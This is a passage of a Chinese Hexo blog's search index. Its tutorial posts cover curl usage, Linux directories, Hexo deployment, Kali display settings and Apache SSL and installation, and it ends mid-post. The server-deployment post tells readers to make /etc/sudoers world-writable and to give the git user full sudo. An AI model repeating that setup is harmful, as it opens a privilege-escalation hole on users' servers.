variable">-x</span> http://proxy.example.com:8080 http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="9-上传文件"><a href="#9-上传文件" class="headerlink" title="9. 上传文件"></a>9. 上传文件</h3><p>你可以使用 <code>-F</code> 选项上传文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-F</span> <span class="token string">"file=@/path/to/file"</span> http://example.com/upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将指定的文件上传到服务器。</p><h3 id="10-指定请求方法"><a href="#10-指定请求方法" class="headerlink" title="10. 指定请求方法"></a>10. 指定请求方法</h3><p>尽管 <code>curl</code> 默认发送的是 GET 请求，你也可以使用 <code>-X</code> 选项指定其他方法，如 PUT, DELETE 等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> DELETE http://example.com/resource/123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="进阶用法"><a href="#进阶用法" class="headerlink" title="进阶用法"></a>进阶用法</h3><p><code>curl</code> 还支持更多复杂的用法，如通过 <code>--data-binary</code> 发送原始二进制数据、使用 <code>--header</code> 添加多个请求头、通过 <code>-u</code> 进行 HTTP 基本认证等。</p><p>如果你想查看 <code>curl</code> 的所有功能和选项，可以通过以下命令查看手册：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">man</span> <span class="token function">curl</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者查看帮助文档：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--help</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统目录功能</title>
      <link href="/2021/09/08/linux-xi-tong-mu-lu-gong-neng/"/>
      <url>/2021/09/08/linux-xi-tong-mu-lu-gong-neng/</url>
      
        <content type="html"><![CDATA[<h1 id="linux系统目录功能"><a href="#linux系统目录功能" class="headerlink" title="linux系统目录功能"></a>linux系统目录功能</h1><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p><table><thead><tr><th>目录名称</th><th>功能</th></tr></thead><tbody><tr><td>/</td><td>主目录</td></tr><tr><td>/bin</td><td>存放二进制文件（可执行文件）（普通用户系统命令）</td></tr><tr><td>/sbin</td><td>存放管理员使用的系统命令</td></tr><tr><td>/boot</td><td>存放启动系统的的一些核心文件</td></tr><tr><td>/dev</td><td>linux的外部设备，以文件方式访问</td></tr><tr><td>/etc</td><td>存放所有的系统管理所需要的配置文件和子目录（全局配置文件）</td></tr><tr><td>/home</td><td>用户主目录，以用户名命名</td></tr><tr><td>/lib</td><td>存放着32位系统最基本的动态连接共享库</td></tr><tr><td>/lib64</td><td>存放着64位系统最基本的动态连接共享库</td></tr><tr><td>/lost+found</td><td>系统非法关机后会存放一些文件</td></tr><tr><td>/root</td><td>超级用户的家目录</td></tr><tr><td>/run</td><td>临时文件系统，存储系统启动以来的信息</td></tr><tr><td>/media</td><td>类windows的其他设备，例如U盘、光驱等</td></tr><tr><td>/mnt</td><td>系统提供该目录是为了让用户临时挂载别的文件系统，例如外部硬盘</td></tr><tr><td>/opt</td><td>给主机额外安装软件所摆放的目录（第三方软件）</td></tr><tr><td>/proc</td><td>存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息，这个目录的内容不在硬盘上而是在内存里</td></tr><tr><td>/srv</td><td>存放一些服务启动之后需要提取的数据</td></tr><tr><td>/sys</td><td>用于输出当前系统硬件设备相关信息虚拟文件系统</td></tr><tr><td>/tmp</td><td>存放一些临时文件的，可以随便操作</td></tr><tr><td>/selinux</td><td>类似于 windows 的防火墙</td></tr><tr><td>/usr</td><td>用于存储系统软件资源，类似于 windows 下的 program files 目录</td></tr><tr><td>/usr/bin</td><td>系统用户使用的应用程序，与系统启动无关</td></tr><tr><td>/usr/sbin</td><td>超级用户使用的应用程序，与系统启动无关</td></tr><tr><td>/usr/src</td><td>内核源代码默认的放置目录</td></tr><tr><td>/usr/lib</td><td>库文件</td></tr><tr><td>/usr/local/</td><td>手工安装的软件保存位置</td></tr><tr><td>/usr/share/</td><td>应用程序的资源文件保存位置</td></tr><tr><td>/usr/include</td><td>C/C++ 等编程语言头文件的放置目录</td></tr><tr><td>/var</td><td>经常被修改的目录放在这个目录，例如日志，动态的</td></tr><tr><td>/var/lib</td><td>程序运行中需要调用或改变的数据保存位置</td></tr><tr><td>/var/log/</td><td>登陆文件放置的目录</td></tr><tr><td>/var/run/</td><td>一些服务和程序运行后，PID（进程 ID）保存位置</td></tr><tr><td>/etc/sysconfig/network-scripts/ifcfg-eth0</td><td>配置网址及GW，使得网卡生效</td></tr><tr><td>/etc/sysconfig/network</td><td>修改机器名及网卡启动，网关等配置</td></tr><tr><td>/etc/resolv.conf</td><td>设置本机的客户端DNS</td></tr><tr><td>/etc/hosts</td><td>设定用户IP与名字的对应表</td></tr><tr><td>/etc/fstab</td><td>记录开机要mount的文件记录</td></tr><tr><td>/etc/inittab</td><td>定启动时init进程把系统设置成怎样的runlevel，以及加载相关的启动文件</td></tr><tr><td>/etc/exports</td><td>设定NFS网络文件系统的配置文件</td></tr><tr><td>/etc/init.d</td><td>存放系统或者服务器以systemV模式启动的脚本</td></tr><tr><td>/etc/xinit.d</td><td>如果服务器是通过xinetd模式运行的，他的脚本要放在这个目录下</td></tr><tr><td>/etc/profile</td><td>系统全局环境变量配置路径</td></tr><tr><td>/etc/profile.d</td><td>加载登录程序的一个目录命令或文件独立存在</td></tr><tr><td>/etc/issue</td><td>记录用户登录前的显示信息</td></tr><tr><td>/etc/motd</td><td>登录提醒</td></tr><tr><td>/etc/redhat-release</td><td>版本号和名称信息</td></tr><tr><td>/etc/group</td><td>设定用户的组名与相关信息</td></tr><tr><td>/etc/passwd</td><td>账号信息</td></tr><tr><td>/etc/shadow</td><td>密码信息</td></tr><tr><td>/etc/sudoers</td><td>可以用sudo命令配置的文件</td></tr><tr><td>/etc/securetty</td><td>设定哪些终端可以让root登录</td></tr><tr><td>/etc/rsyslof.conf</td><td>日志设置文件，在6.4 chkconfig –list rsyslog</td></tr><tr><td>/usr/local</td><td>用来存放用户自编译安装软件目录，通过源码包安装的软件，未指定安装路径</td></tr><tr><td>/var/log/message</td><td>系统默认日志文件，/var/log各种日志存放地</td></tr><tr><td>/var/log/secure</td><td>记录登录系统存取信息的文件，系统日志的安全信息</td></tr><tr><td>/var/log/wtmp</td><td>记录登录者的信息文件</td></tr><tr><td>/var/spool/cron/root</td><td>定时任务crontab默认目录，按用户名命名的文件</td></tr><tr><td>/var/spool/mail</td><td>系统用户邮件存放目录</td></tr><tr><td>/var/spool/clientmqueuesendmail</td><td>邮件临时存放目录</td></tr><tr><td>/etc/login.defs</td><td>所有用户登录时的缺省配置</td></tr><tr><td>/etc/modprobe.conf</td><td>内核模块额外参数设定量被尽，无法写入文件</td></tr><tr><td>/proc</td><td>虚拟目录是内存的映射</td></tr><tr><td>/etc/sysctl.conf</td><td>放在其下面永久生效</td></tr><tr><td>/proc/cpuinfo</td><td>关于处理器的信息</td></tr><tr><td>/proc/meminfo</td><td>系统内存信息</td></tr><tr><td>/proc/interrupts</td><td>正在使用的中断，和曾经有过多少个中断</td></tr><tr><td>/proc/loadavg</td><td>系统负载信息</td></tr><tr><td>/etc/DIR_COLORS</td><td>设定颜色</td></tr><tr><td>/etc/host.conf</td><td>文件说明用户的系统如何查询节点</td></tr><tr><td>/etc/hosts.allow</td><td>通过它可以允许某个ip或者ip段的客户访问linux的某项服务</td></tr><tr><td>/etc/hosts.deny</td><td>通过它可以拒绝某个ip或者ip段的客户访问linux的某项服务</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署hexo到coding</title>
      <link href="/2021/08/13/bu-shu-hexo-dao-coding/"/>
      <url>/2021/08/13/bu-shu-hexo-dao-coding/</url>
      
        <content type="html"><![CDATA[<h1 id="部署hexo到coding"><a href="#部署hexo到coding" class="headerlink" title="部署hexo到coding"></a>部署hexo到coding</h1><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>创建账号登录</p><p>新建项目，名为<code>团队域名</code></p><p>点击<code>代码仓库</code>新建一个仓库</p><p>名为<code>团队域名</code>，勾选<code>readme</code>，公有</p><p>之后便可以通过<code>团队域名.coding.me</code>来访问博客</p><h2 id="建立联系"><a href="#建立联系" class="headerlink" title="建立联系"></a>建立联系</h2><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>里面的内容即是双方通信的密钥</p><p>将密钥复制到 个人账户设置-&gt;SSH公钥</p><h2 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h2><p>添加到配置文件<code>.config.yml</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">- type: <span class="token function">git</span>  repository: git@e.coding.net:团队域名/团队域名/团队域名.git<span class="token punctuation">(</span>你的仓库地址<span class="token punctuation">)</span>  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>持续部署-&gt;网站托管-&gt;新建网站</p><p>静态网站，导入项目，现有仓库，来源就是刚才创建的仓库名，静态网站，香港</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo chexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署hexo到github</title>
      <link href="/2021/08/13/bu-shu-hexo-dao-github/"/>
      <url>/2021/08/13/bu-shu-hexo-dao-github/</url>
      
        <content type="html"><![CDATA[<h1 id="部署hexo到github"><a href="#部署hexo到github" class="headerlink" title="部署hexo到github"></a>部署hexo到github</h1><p>我的本地机器是win10</p><h2 id="设置github"><a href="#设置github" class="headerlink" title="设置github"></a>设置github</h2><p>登录github账号，尽量一个你喜欢的用户名</p><p>创建一个仓库，仓库名为 <code>用户名.github.io</code>，设置公有，添加readme</p><p>待会通过hexo将静态页面部署到<code>https://用户名.github.io</code></p><p>这个url就是你的博客地址</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>去官网下载想要的版本<a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a></p><p>傻瓜式安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token parameter variable">--version</span> <span class="token comment">#查看是否安装成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p><a href="https://nodejs.org/en/download/">Download | Node.js (nodejs.org)</a>选择版本傻瓜式安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>换国内源加速</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="本机与github建立连接"><a href="#本机与github建立连接" class="headerlink" title="本机与github建立连接"></a>本机与github建立连接</h2><p>打开Git Bash，右键或者搜索打开</p><p>设置git配置信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"你的GitHub用户名"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"你的GitHub注册邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>生成ssh密钥文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">"你的GitHub注册邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后连续三次回车</p><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>里面的内容即是双方通信的密钥</p><p>将密钥复制到github-&gt;右上角头像-&gt;settings-&gt;SSH and GPG keys，保存</p><p>本机测试连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>创建一个存放hexo的文件，进入这个目录右键命令行打开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli <span class="token comment">#安装hexo</span><span class="token function">npm</span> update hexo <span class="token parameter variable">-g</span> <span class="token comment">#升级hexo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>初始化hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览测试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo s <span class="token comment">#localhost:4000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>部署命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span> <span class="token comment">#安装部署</span>hexo clean <span class="token comment">#清理缓存，遇到问题一定要先执行</span>hexo g <span class="token comment">#本地生成</span>hexo d <span class="token comment">#部署到服务器(github)</span>hexo n <span class="token comment">#创建一个博客</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>主目录下的<code>.config.yml</code>就是配置文件</p><p>找到deploy添加如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:- type: <span class="token function">git</span>  repository: git@github.com:用户名/用户名.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>site是网站显示内容，自行更改</p><p>更改主题</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">theme： 主题名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h2><p><a href="https://hexo.io/themes/">Themes | Hexo</a>选择一个主题，进入theme目录<code>git clone 主题链接</code></p><p>再根据主题的readme修改网站配置，主题的配置文件主题目录下<code>.config.yml</code></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决kali字体太小</title>
      <link href="/2021/08/13/jie-jue-kali-zi-ti-tai-xiao/"/>
      <url>/2021/08/13/jie-jue-kali-zi-ti-tai-xiao/</url>
      
        <content type="html"><![CDATA[<h1 id="解决kali字体太小"><a href="#解决kali字体太小" class="headerlink" title="解决kali字体太小"></a>解决kali字体太小</h1><p>桌面右键-&gt;应用程序-&gt;设置-&gt;外观-&gt;设置-&gt; 窗口缩放x2</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">GDK_SCALE</span><span class="token operator">=</span><span class="token number">2</span> <span class="token operator">&gt;&gt;</span> ~/.xsessionrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>强制光标变大</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">XCURSOR_SIZE</span><span class="token operator">=</span><span class="token number">48</span> <span class="token operator">&gt;&gt;</span> ~/.xsessionrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>桌面右键-&gt;应用程序-&gt;设置-&gt;外观-&gt;字体-&gt;DPI=180   调字体大小</p><p>以上如果不成功</p><p>左上角搜索<code>Kali HiDPI Mode</code>点击一下即可切换缩放</p><p>多尝试，结合不同的点调试</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将hexo部署到服务器</title>
      <link href="/2021/08/12/jiang-hexo-bu-shu-dao-fu-wu-qi/"/>
      <url>/2021/08/12/jiang-hexo-bu-shu-dao-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="将hexo部署到服务器"><a href="#将hexo部署到服务器" class="headerlink" title="将hexo部署到服务器"></a>将hexo部署到服务器</h1><p>我以前是部署在github上的，本机的部署都是完成了的，本机部署请看其他教程</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adduser <span class="token function">git</span> <span class="token comment">#/home 目录下生成一个git目录</span><span class="token function">passwd</span> <span class="token function">git</span> <span class="token comment">#设置密码</span><span class="token function">chmod</span> a+w /etc/sudoers<span class="token function">vim</span> /etc/sudoers <span class="token comment">#添加git ALL=(ALL) ALL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置SSH密钥"><a href="#配置SSH密钥" class="headerlink" title="配置SSH密钥"></a>配置SSH密钥</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ~/.ssh/authorized_keys<span class="token comment">#在物理机中复制C:\Users\youruser\.ssh\id_rsa.pub中的公钥到上面的文件中</span>保存退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token function">git</span><span class="token builtin class-name">cd</span> /home/git<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> projects/hexo <span class="token comment"># 建立项目目录</span><span class="token function">mkdir</span> repos <span class="token comment">#创建仓库目录</span><span class="token builtin class-name">cd</span> repos<span class="token function">git</span> init <span class="token parameter variable">--bare</span> hexo.git <span class="token comment">#创建仓库</span><span class="token function">chown</span> <span class="token parameter variable">-R</span> git:git /home/git/repos/hexo.git <span class="token comment"># 给git用户添加权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建一个钩子"><a href="#创建一个钩子" class="headerlink" title="创建一个钩子"></a>创建一个钩子</h2><p>接上面继续操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> hexo.git/hooks<span class="token function">vim</span> post-receive <span class="token comment"># 创建一个钩子</span><span class="token comment">#添加如下文件</span><span class="token comment">#!/bin/sh</span><span class="token function">git</span> --work-tree<span class="token operator">=</span>/var/www/blog --git-dir<span class="token operator">=</span>/home/git/repos/hexo.git checkout <span class="token parameter variable">-f</span><span class="token function">chmod</span> +x post-receive <span class="token comment"># 添加可执行权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="本地建立SSH信任关系"><a href="#本地建立SSH信任关系" class="headerlink" title="本地建立SSH信任关系"></a>本地建立SSH信任关系</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub git@server_ip <span class="token comment"># 建立信任关系</span><span class="token function">ssh</span> git@server_ip <span class="token comment"># 试一下能不能登录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="更改git用户默认的shell"><a href="#更改git用户默认的shell" class="headerlink" title="更改git用户默认的shell"></a>更改git用户默认的shell</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells <span class="token comment"># 查看 git-shell 是否在登录方式里面</span><span class="token function">which</span> git-shell <span class="token comment"># 找到git-shell的路径，记下来</span><span class="token function">vim</span> /etc/shells然后把刚才记下来的路径添加进去<span class="token function">vim</span> /etc/passwd<span class="token comment">#把git:x:1000:1000::/home/git:/bin/bash修改为git:x:1000:1000:,,,:/home/git:/usr/bin/git-shell</span><span class="token comment">#没有就算了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><p>报错<code>remote: fatal: cannot create directory at '2019': Permission denied</code></p><p>部署目录没有写的权限，改法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> go+w /home/git/projects/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache部署ssl</title>
      <link href="/2021/08/11/apache-bu-shu-ssl/"/>
      <url>/2021/08/11/apache-bu-shu-ssl/</url>
      
        <content type="html"><![CDATA[<h1 id="apache部署ssl"><a href="#apache部署ssl" class="headerlink" title="apache部署ssl"></a>apache部署ssl</h1><h2 id="开启mod-ssl模块"><a href="#开启mod-ssl模块" class="headerlink" title="开启mod_ssl模块"></a>开启mod_ssl模块</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">LoadModule socache_shmcb_module modules/mod_socache_shmcb.soLoadModule ssl_module modules/mod_ssl.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="加载配置文件"><a href="#加载配置文件" class="headerlink" title="加载配置文件"></a>加载配置文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">includeOptionalconf.d/*.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="保存证书"><a href="#保存证书" class="headerlink" title="保存证书"></a>保存证书</h2><p>在apache安装目录中新建cert目录，将证书解压至此</p><h2 id="修改ssl-conf配置文件"><a href="#修改ssl-conf配置文件" class="headerlink" title="修改ssl.conf配置文件"></a>修改ssl.conf配置文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>VirtualHost *:44<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>         ServerName   <span class="token comment">#修改为申请证书时绑定的域名www.YourDomainName1.com。                    </span>    DocumentRoot  /data/www/hbappserver/public              SSLEngine on       SSLProtocol all <span class="token parameter variable">-SSLv2</span> <span class="token parameter variable">-SSLv3</span> <span class="token comment"># 添加SSL协议支持协议，去掉不安全的协议。</span>    SSLCipherSuite HIGH:<span class="token operator">!</span>RC4:<span class="token operator">!</span>MD5:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>eNULL:<span class="token operator">!</span>NULL:<span class="token operator">!</span>DH:<span class="token operator">!</span>EDH:<span class="token operator">!</span>EXP:+MEDIUM   <span class="token comment"># 修改加密套件。</span>    SSLHonorCipherOrder on    SSLCertificateFile cert/domain name1_public.crt   <span class="token comment"># 将domain name1_public.crt替换成您证书文件名。</span>    SSLCertificateKeyFile cert/domain name1.key   <span class="token comment"># 将domain name1.key替换成您证书的密钥文件名。</span>    SSLCertificateChainFile cert/domain name1_chain.crt  <span class="token comment"># 将domain name1_chain.crt替换成您证书的密钥文件名；证书链开头如果有#字符，请删除。</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span class="token comment">#如果证书包含多个域名，复制以上参数，并将ServerName替换成第二个域名。 </span><span class="token operator">&lt;</span>VirtualHost *:44<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>         ServerName   <span class="token comment">#修改为申请证书时绑定的第二个域名www.YourDomainName2.com。                    </span>    DocumentRoot  /data/www/hbappserver/public              SSLEngine on       SSLProtocol all <span class="token parameter variable">-SSLv2</span> <span class="token parameter variable">-SSLv3</span> <span class="token comment"># 添加SSL协议支持协议，去掉不安全的协议。</span>    SSLCipherSuite HIGH:<span class="token operator">!</span>RC4:<span class="token operator">!</span>MD5:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>eNULL:<span class="token operator">!</span>NULL:<span class="token operator">!</span>DH:<span class="token operator">!</span>EDH:<span class="token operator">!</span>EXP:+MEDIUM   <span class="token comment"># 修改加密套件。</span>    SSLHonorCipherOrder on    SSLCertificateFile cert/domain name2_public.crt   <span class="token comment"># 将domain name2替换成您申请证书时的第二个域名。</span>    SSLCertificateKeyFile cert/domain name2.key   <span class="token comment"># 将domain name2替换成您申请证书时的第二个域名。</span>    SSLCertificateChainFile cert/domain name2_chain.crt  <span class="token comment"># 将domain name2替换成您申请证书时的第二个域名；证书链开头如果有#字符，请删除。</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重启生效"><a href="#重启生效" class="headerlink" title="重启生效"></a>重启生效</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTTP请求自动跳转HTTPS"><a href="#HTTP请求自动跳转HTTPS" class="headerlink" title="HTTP请求自动跳转HTTPS"></a>HTTP请求自动跳转HTTPS</h2><p>httpd.conf文件中的<code>&lt;VirtualHost *:80&gt; &lt;/VirtualHost&gt;</code>中间，添加以下重定向代码。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RewriteEngine onRewriteCond %<span class="token punctuation">{</span>SERVER_PORT<span class="token punctuation">}</span> <span class="token operator">!</span>^443$RewriteRule ^<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ https://%<span class="token punctuation">{</span>SERVER_NAME<span class="token punctuation">}</span><span class="token variable">$1</span> <span class="token punctuation">[</span>L,R<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache安装</title>
      <link href="/2021/08/11/apache-an-zhuang/"/>
      <url>/2021/08/11/apache-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache安装"><a href="#Apache安装" class="headerlink" title="Apache安装"></a>Apache安装</h1><p>首先安装apr，apr-util，apr-iconv，prce，这几个依赖包能提高生产力</p><h2 id="apr"><a href="#apr" class="headerlink" title="apr"></a>apr</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org//apr/apr-1.7.0.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-1.7.0.tar.gz<span class="token builtin class-name">cd</span> apr-1.7.0./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apr-util"><a href="#apr-util" class="headerlink" title="apr-util"></a>apr-util</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org/apr/apr-util-1.6.1.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-util-1.6.1.tar.gz<span class="token builtin class-name">cd</span> apr-util-1.6.1./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/apr-util --with-apr<span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apr-iconv"><a href="#apr-iconv" class="headerlink" title="apr-iconv"></a>apr-iconv</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://downloads.apache.org/apr/apr-iconv-1.2.2.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apr-iconv-1.2.2.tar.gz<span class="token builtin class-name">cd</span> apr-iconv-1.2.2./configure <span class="token parameter variable">--prefix</span><span class="token 